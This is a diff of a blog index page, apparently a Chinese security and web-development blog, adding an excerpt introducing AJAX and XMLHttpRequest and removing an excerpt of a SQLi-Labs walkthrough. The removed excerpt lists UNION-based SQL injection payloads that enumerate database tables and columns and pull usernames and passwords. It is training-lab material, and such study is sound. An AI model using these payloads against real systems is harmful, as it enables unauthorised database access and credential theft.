@@ -115,6 +115,56 @@
     
     
       <div class="col-12 col-md-4 m-auto">
+        <a href="/2019/09/19/学一下Ajax/" style="background-image: url(/post_img/学一下ajax.jpg);" class="img-fluid rounded z-depth-3 index-thumbnails" target="_self"></a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/19/学一下Ajax/">
+        <p class="h4 index-header">学一下Ajax</p>
+        <div class="index-excerpt">
+          
+            <div class="index-text mb-1">0x01 Axaj简介（1）概述AJAX = 异步 JavaScript 和 XML。
+AJAX 是一种用于创建快速动态网页的技术。
+通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。
+（2）Ajax的执行过程使用Ajax技术通常包括以下几个步骤：
+
+创建一个Ajax对象。
+在此对象的基础上根据HTTP协议的规范向服务器发送HTTP请求。
+服务器接收到Ajax请求后会响应此请求，并根据事先约定的格式返回相应的数据集。
+浏览器接收到服务器的响应，获取返回数据集，更新部分网页内容。
+
+用一句话概括，即Ajax通过XMLHttpRequest对象向服务器发出HTTP请求，当获取到服务器返回的数据后进行相应的页面数据的渲染处理。
+
+0x02 XHR对象创建Ajax的核心是XMLHttpRequest对象（简称为XHR对象）的使用，XMLHttpRequest对象作为浏览器请求服务器的一个接口，可以使用异步的方式通过浏览器向服务器发送请求并解析服务器的响应。
+使用Ajax服务器发送HTTP请求的首要任务是创建一</div>
+          
+        </div>
+      </a>
+
+        <div>
+          
+            <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-19&nbsp;&nbsp;
+          
+          
+            <i class="iconfont icon-inbox"></i>
+            
+              <a href="/categories/JavaScript">JavaScript</a>&nbsp;
+            &nbsp;
+          
+          
+            <i class="iconfont icon-tag"></i>
+            
+              <a href="/tags/JavaScript">JavaScript</a>&nbsp;
+            
+          
+        </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
         <a href="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/" style="background-image: url(/post_img/XNUCA&ByteCTF.jpg);" class="img-fluid rounded z-depth-3 index-thumbnails" target="_self"></a>
       </div>
     
@@ -613,48 +663,6 @@ PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数
             <i class="iconfont icon-tag"></i>
             
               <a href="/tags/PHP">PHP</a>&nbsp;
-            
-          
-        </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-      <div class="col-12 col-md-4 m-auto">
-        <a href="/2019/07/26/SQLi-Labs通关笔记/" style="background-image: url(/post_img/SQLi-Labs通关笔记.jpg);" class="img-fluid rounded z-depth-3 index-thumbnails" target="_self"></a>
-      </div>
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/07/26/SQLi-Labs通关笔记/">
-        <p class="h4 index-header">SQLi-Labs通关笔记</p>
-        <div class="index-excerpt">
-          
-            <div class="index-text mb-1">Less-1?id=1&#39; 单引号报错，存在注入
-?id=1&#39; order by 4 %23&#39;报错，存在三列
-?id=-1&#39; union select 1,2,3%23 发现2和3的位置可以回显，于是进行注入
-?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23得到当前库下所有表名
-?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3%23得到users表下的所有列名
-?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(passw</div>
-          
-        </div>
-      </a>
-
-        <div>
-          
-            <i class="iconfont icon-riqi2"></i>&nbsp;2019-07-26&nbsp;&nbsp;
-          
-          
-            <i class="iconfont icon-inbox"></i>
-            
-              <a href="/categories/CTF">CTF</a>&nbsp;
-            &nbsp;
-          
-          
-            <i class="iconfont icon-tag"></i>
-            
-              <a href="/tags/CTF">CTF</a>&nbsp;
             
           
         </div>
